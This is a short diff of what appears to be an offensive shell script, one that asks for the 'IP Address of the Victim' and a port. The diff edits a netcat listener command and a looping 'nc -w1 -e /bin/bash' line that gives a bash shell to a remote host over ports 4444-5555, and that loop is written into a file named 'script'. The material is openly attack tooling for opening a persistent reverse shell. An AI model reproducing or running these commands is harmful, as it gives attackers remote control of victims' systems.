@@ -11,7 +11,7 @@ echo -n "Enter IP Address of the Victim: "
 read ip_addr
 echo -n "Enter Port Number(4444-5555): "
 read $port
-nc -nl $ip_addr $port 
+nc -nlv $ip_addr -p $port 
 
 }
 
@@ -42,7 +42,7 @@ do
 	done
 	while (true)
 	do
-		nc $ip -w1 -e /bin/bash 4444-5555
+		nc -w1 -e /bin/bash $ip 4444-5555
 	done
 done'>script
 
